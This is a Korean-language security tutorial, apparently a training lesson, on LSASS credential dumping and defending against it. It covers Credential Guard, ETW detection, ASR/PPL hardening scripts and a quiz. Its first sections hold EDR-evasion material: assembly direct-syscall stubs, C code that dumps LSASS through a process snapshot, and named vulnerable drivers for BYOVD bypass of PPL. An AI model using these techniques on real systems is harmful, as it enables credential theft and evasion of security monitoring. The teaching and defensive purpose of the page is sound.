#1. Direct Syscall 기반 LSASS 덤프

🔩

Syscall과 EDR 우회 원리

Windows 사용자 모드 API(ntdll.dll)는 Syscall Stub를 통해 커널로 전환합니다. EDR은 ntdll.dll의 함수를 후킹하여 모든 API 호출을 감시합니다. Direct Syscall은 ntdll.dll을 우회하여 어셈블리 코드로 시스템 콜을 직접 수행합니다. 이로 인해 사용자 모드 후킹을 완전히 회피할 수 있습니다.

direct_syscall.asm
ADVANCED · x86-64 Assembly
⚠️ 교육 목적 코드 — 어셈블리 코드 분석 — 교육 목적
; Direct Syscall for NtOpenProcess (x64)
; EDR이 ntdll.dll을 후킹해도 이 코드는 감지되지 않음
NtOpenProcess PROC
mov r10, rcx ; 첫 번째 인자를 r10에 보관
mov eax, 26h ; NtOpenProcess syscall 번호 (Win 10)
syscall ; 커널 직접 호출!
ret ; ntdll.dll 완전 우회
NtOpenProcess ENDP
; NtReadVirtualMemory도 동일 패턴으로 구현
NtReadVirtualMemory PROC
mov r10, rcx
mov eax, 3Fh ; NtReadVirtualMemory 번호
syscall
ret
NtReadVirtualMemory ENDP

⚠️ Syscall 번호는 OS 버전마다 다름

Windows의 Syscall 번호는 빌드 버전마다 변경됩니다. 공격 도구는 런타임에 ntdll.dll에서 올바른 Syscall 번호를 동적으로 추출하거나, 버전별 테이블을 내장합니다. 이는 '무기화'의 중요한 단계입니다.

#2. 프로세스 스냅샷 기법 (PssCaptureSnapshot)

📸

스냅샷 기반 우회

PssCaptureSnapshot API는 프로세스의 메모리 스냅샷을 생성합니다. 이 방법은 LSASS 프로세스에 직접 접근하지 않고 스냅샷을 통해 간접적으로 메모리를 읽으므로, 일부 EDR의 ProcessAccess 이벤트 감지를 우회할 수 있습니다.

snapshot_dump.c
ADVANCED · C
⚠️ 교육 목적 코드 — 고급 우회 기법 분석 — 허가된 환경에서만 실행
#include <windows.h>
#include <processsnapshot.h>
#include <dbghelp.h>
// 1단계: LSASS 프로세스 핸들 획득
HANDLE hProcess = OpenProcess(
PROCESS_ALL_ACCESS, FALSE, lsassPid);
// 2단계: 프로세스 스냅샷 캡처
HPSS hSnapshot;
DWORD flags = PSS_CAPTURE_VA_CLONE
| PSS_CAPTURE_HANDLES
| PSS_CAPTURE_HANDLE_TRACE;
PssCaptureSnapshot(hProcess, flags, 0, &hSnapshot);
// 3단계: 스냅샷에서 MiniDump 생성
// 이 시점에서 원본 LSASS에 직접 접근하지 않음!
MiniDumpWriteDump(
hSnapshot, lsassPid, hFile,
MiniDumpWithFullMemory,
NULL, NULL,
&callbackInfo // 스냅샷용 콜백
);

#3. Credential Guard 내부 구조

🏗️

VBS (Virtualization-Based Security) 아키텍처

Credential Guard는 Hyper-V 하이퍼바이저를 이용하여 LSASS의 자격증명 처리를 격리된 가상 환경(Isolated LSA, LSAIso)에서 수행합니다. 관리자 권한을 가진 공격자라 하더라도, VTL 0(일반 OS)에서 VTL 1(격리 환경)의 메모리에 접근할 수 없습니다.

Credential Guard 격리 아키텍처

  ┌───────────── Hyper-V Hypervisor ─────────────┐
  │                                                │
  │  ┌─── VTL 0 (Normal) ───┐  ┌── VTL 1 (Secure) ─┐  │
  │  │                       │  │                     │  │
  │  │  Windows OS           │  │  Isolated LSA       │  │
  │  │  ┌──────────┐         │  │  (LSAIso.exe)       │  │
  │  │  │ LSASS    │─ RPC ──→│  │  ┌──────────────┐  │  │
  │  │  │ (proxy)  │         │  │  │ 자격증명 보관 │  │  │
  │  │  └──────────┘         │  │  │ NTLM 해시     │  │  │
  │  │  ┌──────────┐         │  │  │ Kerberos 키   │  │  │
  │  │  │ 공격자   │  ✘ ───→│  │  └──────────────┘  │  │
  │  │  │ (admin)  │  접근   │  │                     │  │
  │  │  └──────────┘  불가!  │  │  ※ VTL 0에서      │  │
  │  │                       │  │    접근 불가        │  │
  │  └───────────────────────┘  └─────────────────────┘  │
  └────────────────────────────────────────────────────┘
✅

Credential Guard 활성화 확인

Credential Guard 상태 확인 방법: ① msinfo32.exe → '가상화 기반 보안' 항목. ② PowerShell: Get-CimInstance -ClassName Win32_DeviceGuard. ③ 이벤트 로그: Application and Services Logs → Microsoft → Windows → DeviceGuard → Operational.

#4. ETW 기반 커널 레벨 탐지

📡

ETW (Event Tracing for Windows)

ETW는 Windows 커널에 내장된 이벤트 추적 인프라입니다. 사용자 모드 후킹을 우회하는 Direct Syscall도 커널에서는 ETW 이벤트를 발생시킵니다. Microsoft-Windows-Threat-Intelligence ETW 프로바이더는 커널 레벨에서 프로세스 메모리 접근을 추적합니다.

etw_monitor.ps1
ADVANCED · powershell
⚠️ 교육 목적 코드 — 탐지 도구 코드 — 방어 목적
# ETW Threat Intelligence Provider 세션 생성
# 커널 레벨에서 LSASS 메모리 접근 탐지
$sessionName = 'LsassGuard'
$providerGuid = [Guid]'F4E1897C-BB5D-5668-F1D8-040F4D8DD344'
# ETW 세션 시작
New-EtwTraceSession -Name $sessionName `
-LogFileMode 'RealTime' `
-FlushTimer 1
# Threat Intelligence Provider 추가
Add-EtwTraceProvider -SessionName $sessionName `
-Guid $providerGuid `
-Level 5 ` # Verbose
-MatchAnyKeyword 0xFFFFFFFF
# 이벤트 실시간 소비
Get-EtwTraceSession -Name $sessionName |
Receive-EtwEvent | Where-Object {
$_.TargetProcessId -eq (Get-Process lsass).Id
} | ForEach-Object {
Write-Warning "[ALERT] LSASS Access: $($_.SourceProcessName)"
}

#5. PPL 보호 우회와 드라이버 취약점

⚠️ PPL 우회는 커널 취약점을 요구함

Protected Process Light(PPL)로 보호된 LSASS를 우회하려면 서명된 드라이버의 취약점을 악용해야 합니다. 이는 BYOVD(Bring Your Own Vulnerable Driver) 공격으로 알려져 있으며, 커널 수준의 권한이 필요하므로 공격 난이도가 매우 높습니다.

🚗💥

BYOVD (Bring Your Own Vulnerable Driver)

공격자는 합법적이지만 취약한 서명된 드라이버를 로드하여 커널 모드 코드 실행을 달성합니다. 예: RTCore64.sys(MSI Afterburner), dbutil_2_3.sys(Dell). 커널 모드에서 PPL 보호 플래그를 제거하면 LSASS에 자유롭게 접근할 수 있습니다.

알려진 취약 드라이버 사례

드라이버 소프트웨어 CVE 악용 APT

#6. 방어 강화: ASR 규칙과 WDAC

🛡️

Attack Surface Reduction(ASR) 규칙

Microsoft Defender의 ASR 규칙 중 'Block credential stealing from the Windows local security authority subsystem (lsass.exe)' (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)는 LSASS에 대한 의심스러운 접근을 차단합니다. GPO 또는 Intune으로 배포할 수 있습니다.

defense_config.ps1
ADVANCED · powershell
⚠️ 교육 목적 코드 — 방어 설정 스크립트 — 실제 환경에서 테스트 후 적용
# ASR 규칙: LSASS 자격증명 도용 차단
Set-MpPreference -AttackSurfaceReductionRules_Ids `
'9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2' `
-AttackSurfaceReductionRules_Actions Enabled
# PPL 활성화 (레지스트리)
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' `
-Name 'RunAsPPL' -Value 1 -Type DWord
# WDigest 평문 비밀번호 저장 비활성화
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' `
-Name 'UseLogonCredential' -Value 0 -Type DWord
# WDAC: 취약 드라이버 차단 정책
# Microsoft 권장 드라이버 차단 목록 적용
# https://learn.microsoft.com/windows/security/threat-protection/
Copy-Item -Path '.\SiPolicy.p7b' `
-Destination 'C:\Windows\System32\CodeIntegrity\'

#Q. 종합 퀴즈

Q1. Direct Syscall이 ntdll.dll 후킹을 우회할 수 있는 근본적 이유는?

💡 x64 syscall 명령어는 CPU의 STAR/LSTAR MSR 레지스터를 통해 직접 커널 모드로 전환합니다. ntdll.dll의 Syscall Stub를 거치지 않으므로, EDR이 ntdll.dll에 설치한 인라인 후킹이나 IAT 후킹을 완전히 우회합니다.

Q2. Credential Guard에서 자격증명이 보호되는 핵심 원리는?

💡 Credential Guard는 Hyper-V 하이퍼바이저의 VTL(Virtual Trust Level) 격리를 사용합니다. 자격증명 처리는 VTL 1의 LSAIso.exe에서 수행되며, VTL 0의 어떤 프로세스도(관리자 포함) VTL 1 메모리에 접근할 수 없습니다.

Q3. BYOVD 공격에서 공격자가 취약한 드라이버를 사용하는 이유는?

💡 Windows는 KMCS(Kernel Mode Code Signing) 정책으로 서명된 드라이버만 커널에 로드합니다. 공격자는 합법적으로 서명되었지만 취약점이 있는 드라이버를 이용해 커널 모드 코드 실행을 달성하고, PPL 보호를 비활성화합니다.

Q4. ETW Threat Intelligence Provider가 Direct Syscall도 탐지할 수 있는 이유는?

💡 ETW Threat Intelligence Provider는 Windows 커널 내부에 내장되어 있습니다. syscall이 커널에 도착하면 커널 내부의 ETW 콜백이 작동하므로, 사용자 모드에서 ntdll.dll을 우회하더라도 커널 레벨의 ETW 이벤트는 정상적으로 발생합니다.

Q5. LSASS 덤프 침해 대응 시 가장 우선적으로 해야 할 조치는?

💡 자격증명이 탈취된 경우, 공격자가 즉시 횡단이동(Lateral Movement)에 사용할 수 있으므로 네트워크 격리와 탈취 가능한 모든 자격증명의 즉시 리셋이 최우선입니다. 포렌식은 격리 후 수행합니다.
